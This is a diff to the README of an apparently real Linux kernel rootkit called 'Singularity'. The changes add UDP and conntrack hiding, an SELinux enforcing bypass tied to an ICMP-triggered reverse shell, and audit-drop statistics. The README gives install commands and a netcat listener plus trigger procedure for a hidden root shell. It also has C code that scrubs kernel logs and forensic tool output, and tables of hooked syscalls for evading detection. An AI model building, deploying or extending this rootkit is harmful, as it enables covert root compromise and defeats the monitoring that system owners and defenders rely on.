@@ -18,17 +18,19 @@ Singularity is a sophisticated rootkit that operates at the kernel level, provid
 
 - **Process Hiding**: Make any process completely invisible to the system
 - **File & Directory Hiding**: Conceal files using pattern matching
-- **Network Stealth**: Hide TCP connections and ports
+- **Network Stealth**: Hide TCP/UDP connections, ports, and conntrack entries
 - **Privilege Escalation**: Multiple methods to gain instant root access
 - **Log Sanitization**: Filter kernel logs and system journals in real-time
 - **Self-Hiding**: Remove itself from module lists and system monitoring
 - **Remote Access**: ICMP-triggered reverse shell with automatic hiding
 - **Anti-Detection**: Block eBPF tools, io_uring operations, and prevent module loading
-- **Audit Evasion**: Drop audit messages for hidden processes at netlink level
+- **Audit Evasion**: Drop audit messages for hidden processes at netlink level with statistics tracking
 - **Memory Forensics Evasion**: Filter /proc/kcore, /proc/kallsyms, /proc/vmallocinfo
 - **Cgroup Filtering**: Filter hidden PIDs from cgroup.procs
 - **Syslog Evasion**: Hook do_syslog to filter klogctl() kernel ring buffer access
 - **Debugfs Evasion**: Filter output of tools that read raw block devices
+- **Conntrack Filtering**: Hide connections from /proc/net/nf_conntrack and netlink SOCK_DIAG/NETFILTER queries
+- **SELinux Evasion**: Automatic SELinux enforcing mode bypass on ICMP trigger
 
 ---
 
@@ -37,7 +39,8 @@ Singularity is a sophisticated rootkit that operates at the kernel level, provid
 - Environment-triggered privilege elevation via signals and environment variables
 - Complete process hiding from /proc and monitoring tools
 - Pattern-based filesystem hiding for files and directories
-- Network connection concealment from netstat, ss, and packet analyzers
+- Network connection concealment from netstat, ss, conntrack, and packet analyzers
+- Advanced netlink filtering (SOCK_DIAG, NETFILTER/conntrack messages)
 - Real-time kernel log filtering for dmesg, journalctl, and klogctl
 - Module self-hiding from lsmod and /sys/module
 - Automatic kernel taint flag normalization
@@ -50,13 +53,14 @@ Singularity is a sophisticated rootkit that operates at the kernel level, provid
 - Multi-architecture support (x64 + ia32)
 - Network packet-level filtering with raw socket protection
 - Protection against all file I/O variants (read, write, splice, sendfile, tee, copy_file_range)
-- Netlink-level audit message filtering to evade auditd detection
+- Netlink-level audit message filtering with statistics tracking to evade auditd detection
 - Cgroup PID filtering to prevent detection via `/sys/fs/cgroup/*/cgroup.procs`
 - TaskStats netlink blocking to prevent PID enumeration
 - /proc/kcore filtering to evade memory forensics tools (Volatility, crash, gdb)
 - do_syslog hook to filter klogctl() and prevent kernel ring buffer leaks
 - Block device output filtering to evade debugfs and similar disk forensics tools
 - journalctl -k output filtering via write hook
+- SELinux enforcing mode bypass capability for ICMP-triggered shells
 
 ---
 
@@ -73,9 +77,9 @@ Singularity is a sophisticated rootkit that operates at the kernel level, provid
 ```bash
 git clone https://github.com/MatheuZSecurity/Singularity
 cd Singularity
-make
-sudo insmod singularity.ko
+sudo bash setup.sh
 sudo bash scripts/x.sh
+cd ..
 ```
 
 That's it. The module automatically:
@@ -180,23 +184,45 @@ static const char *hidden_patterns[] = {
 **Edit `modules/clear_taint_dmesg.c` - find and update `line_contains_sensitive_info()`:**
 ```c
 notrace static bool line_contains_sensitive_info(const char *line) {
+    const char *p;
+
     if (!line)
         return false;
-    return (strstr(line, "taint") != NULL || 
-            strstr(line, "journal") != NULL ||
-            strstr(line, ".7f2a9b1c8d") != NULL ||    // Your first random name
-            strstr(line, ".e5bb0ff518") != NULL ||    // Your second random name
-            strstr(line, "hook") != NULL || 
-            strstr(line, "hooked_") != NULL ||
-            strstr(line, "constprop") != NULL ||
-            strstr(line, "kallsyms_lookup_name") != NULL ||
-            strstr(line, "clear_taint") != NULL || 
-            strstr(line, "__builtin__ftrace") != NULL ||
-            strstr(line, "filter_kmsg") != NULL || 
-            strstr(line, "create_trampoline+") != NULL ||
-            strstr(line, "fh_install") != NULL || 
-            strstr(line, "fh_remove") != NULL ||
-            strstr(line, "ftrace_helper") != NULL);
+
+    for (p = line; *p; p++) {
+        switch (*p) {
+        case '_':
+            if (strncmp(p, "__builtin__ftrace", 17) == 0) return true;
+            break;
+        case 'c':
+            if (strncmp(p, "create_trampoline+", 18) == 0) return true;
+            if (strncmp(p, "constprop", 9) == 0) return true;
+            if (strncmp(p, "clear_taint", 11) == 0) return true;
+            break;
+        case 'h':
+            if (strncmp(p, "hook", 4) == 0) return true;
+            break;
+        case 't':
+            if (strncmp(p, "taint", 5) == 0) return true;
+            break;
+        case 's':
+            if (strncmp(p, ".7f2a9b1c8d", 11) == 0) return true;  // Your pattern
+            break;
+        case 'S':
+            if (strncmp(p, "Singularity", 11) == 0) return true;
+            break;
+        case 'k':
+            if (strncmp(p, "kallsyms_lookup_name", 20) == 0) return true;
+            break;
+        case 'f':
+            if (strncmp(p, "filter_kmsg", 11) == 0) return true;
+            if (strncmp(p, "fh_install", 10) == 0) return true;
+            if (strncmp(p, "fh_remove", 9) == 0) return true;
+            if (strncmp(p, "ftrace_helper", 13) == 0) return true;
+            break;
+        }
+    }
+    return false;
 }
 ```
 
@@ -214,9 +240,25 @@ static notrace bool buffer_has_singularity(const char *buf, size_t len)
 static notrace void sanitize_fs_tool_buffer_inplace(char *buf, size_t len)
 {
     const size_t pattern_len = 11;  // Length of your pattern
-    // ... update the pattern in memmem_ci call
-    found = memmem_ci(ptr, remaining, ".7f2a9b1c8d", pattern_len);  // Your pattern
-    // ...
+    char *ptr;
+    size_t remaining;
+    void *found;
+    
+    if (!buf || len < pattern_len)
+        return;
+    
+    ptr = buf;
+    remaining = len;
+    
+    while (remaining >= pattern_len) {
+        found = memmem_ci(ptr, remaining, ".7f2a9b1c8d", pattern_len);  // Your pattern
+        if (!found)
+            break;
+        
+        memset(found, ' ', pattern_len);
+        ptr = (char *)found + pattern_len;
+        remaining = len - (ptr - buf);
+    }
 }
 ```
 
@@ -321,9 +363,18 @@ nc -lvnp 8081
 ss -tulpn | grep 8081        # (no output)
 netstat -tulpn | grep 8081   # (no output)
 lsof -i :8081                # (no output)
+cat /proc/net/nf_conntrack | grep 8081  # (no output)
+
+# Even advanced netlink queries are filtered
+ss -tapen | grep 8081        # (no output)
+conntrack -L | grep 8081     # (no output)
 ```
 
-Packets are dropped at raw socket level (tpacket_rcv) and hidden from /proc/net/* interfaces.
+Packets are dropped at raw socket level (tpacket_rcv) and hidden from:
+- /proc/net/* interfaces (tcp, tcp6, udp, udp6)
+- /proc/net/nf_conntrack
+- Netlink SOCK_DIAG queries (used by ss, lsof)
+- Netlink NETFILTER/conntrack messages (used by conntrack tool)
 
 <p align="center">
 <img src="https://i.imgur.com/WUuLu1q.png">
@@ -331,7 +382,7 @@ Packets are dropped at raw socket level (tpacket_rcv) and hidden from /proc/net/
 
 ### ICMP Reverse Shell
 
-Trigger a hidden reverse shell remotely:
+Trigger a hidden reverse shell remotely with automatic SELinux bypass:
 
 **1. Start listener:**
 ```bash
@@ -343,7 +394,7 @@ nc -lvnp 8081
 sudo python3 scripts/trigger.py <target_ip>
 ```
 
-**3. Receive root shell** (automatically hidden with all child processes)
+**3. Receive root shell** (automatically hidden with all child processes, SELinux enforcing mode bypassed if active)
 
 <p align="center">
 <img src="https://i.imgur.com/4bmbmwY.png">
@@ -387,8 +438,11 @@ Real-time filtering of sensitive strings from all kernel log interfaces:
 | `/sys/kernel/debug/tracing/*` | read hook | ✅ Filtered |
 | `/var/log/kern.log`, `syslog`, `auth.log` | read hook | ✅ Filtered |
 | `/proc/kallsyms`, `/proc/kcore`, `/proc/vmallocinfo` | read hook | ✅ Filtered |
+| `/proc/net/nf_conntrack` | read hook | ✅ Filtered |
 
 Filtered keywords: taint, journal, singularity, Singularity, matheuz, zer0t, kallsyms_lookup_name, obliviate, hook, hooked_, constprop, clear_taint, ftrace_helper, fh_install, fh_remove
+
+**Note**: Audit messages for hidden PIDs are dropped at netlink level with statistics tracking (get_blocked_audit_count, get_total_audit_count)
 
 ### Disk Forensics Evasion
 
@@ -443,7 +497,7 @@ Child processes automatically tracked via sched_process_fork tracepoint hook.
 
 **Memory Forensics**: Volatility, crash, gdb (via /proc/kcore filtering)
 
-**Network**: netstat, ss, lsof, tcpdump, wireshark, /proc/net/*
+**Network**: netstat, ss, lsof, tcpdump, wireshark, conntrack, /proc/net/*
 
 **Logs & Traces**: dmesg, journalctl -k, klogctl, strace, ltrace, ftrace, perf, bpftrace, bpftool, libbpf
 
@@ -508,7 +562,7 @@ Don't use `load_and_persistence.sh` for stealth operations - module becomes visi
 | openat | open.c | Block access to hidden /proc/[pid] |
 | readlinkat | hiding_readlink.c | Block symlink resolution |
 | chdir | hiding_chdir.c | Prevent cd into hidden dirs |
-| read, pread64, readv, preadv | clear_taint_dmesg.c | Filter kernel logs, kcore, kallsyms, cgroup PIDs |
+| read, pread64, readv, preadv | clear_taint_dmesg.c | Filter kernel logs, kcore, kallsyms, cgroup PIDs, nf_conntrack |
 | do_syslog | clear_taint_dmesg.c | Filter klogctl()/syslog() kernel ring buffer |
 | sched_debug_show | clear_taint_dmesg.c | Filter scheduler debug output |
 | write, writev, pwrite64, pwritev, pwritev2 | hooks_write.c | Block ftrace control + filter disk forensics + filter journalctl output |
@@ -521,11 +575,13 @@ Don't use `load_and_persistence.sh` for stealth operations - module becomes visi
 | sysinfo | become_root.c | Adjusts process count |
 | pidfd_open | become_root.c | Returns ESRCH for hidden PIDs |
 | tcp4_seq_show, tcp6_seq_show | hiding_tcp.c | Hide TCP connections from /proc/net |
+| udp4_seq_show, udp6_seq_show | hiding_tcp.c | Hide UDP connections from /proc/net |
 | tpacket_rcv | hiding_tcp.c | Drop packets at raw socket level |
+| recvmsg | audit.c | Filter netlink SOCK_DIAG and NETFILTER messages |
+| netlink_unicast | audit.c | Drop audit messages for hidden PIDs |
 | bpf | bpf_hook.c | Block eBPF tracing operations |
 | init_module, finit_module | hooking_insmod.c | Prevent module loading |
-| icmp_rcv | icmp.c | ICMP-triggered reverse shell |
-| netlink_unicast | audit.c | Drop audit messages for hidden PIDs |
+| icmp_rcv | icmp.c | ICMP-triggered reverse shell with SELinux bypass |
 | taskstats_user_cmd | task.c | Block TaskStats queries for hidden PIDs |
 | sched_process_fork (tracepoint) | trace.c | Track child processes |
 | tainted_mask (kthread) | reset_tainted.c | Clear kernel taint flags |
